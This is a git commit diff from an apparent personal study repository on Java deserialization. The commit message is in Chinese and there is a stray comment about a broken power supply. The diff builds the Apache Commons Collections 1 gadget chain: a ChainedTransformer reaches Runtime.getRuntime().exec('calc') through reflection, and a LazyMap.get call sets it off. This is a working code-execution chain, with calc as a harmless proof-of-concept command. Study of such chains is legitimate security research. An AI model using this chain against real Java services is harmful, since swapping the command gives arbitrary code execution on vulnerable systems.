d6aff9ae393d5be610f123fc73e6ac161b2c61c9
dr0se-mirror <2721808339@qq.com>
2024-12-06 21:19:07 +0800

    cc1lazymap 更新到lazyMapForHack.get("Dr0se")的分析

--- CC1/src/main/java/com/drose/CC1Lazymap/cc1Lazy.java
+++ CC1/src/main/java/com/drose/CC1Lazymap/cc1Lazy.java
@@ -1,7 +1,10 @@
 package com.drose.CC1Lazymap;
 
 import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
 import org.apache.commons.collections.map.TransformedMap;
 
 import java.lang.reflect.InvocationTargetException;
@@ -11,7 +14,18 @@ import java.util.Map;
 
 public class cc1Lazy {
     public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
-        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
+//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
         // next 记录，2024/12/05 电脑更新的时候被我强制更换电源寄掉了,花了70难受
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap<Object,Object> hashMap = new HashMap();
+        Map lazyMapForHack = LazyMap.decorate(hashMap, chainedTransformer);
+        lazyMapForHack.get("Dr0se");
     }
 }
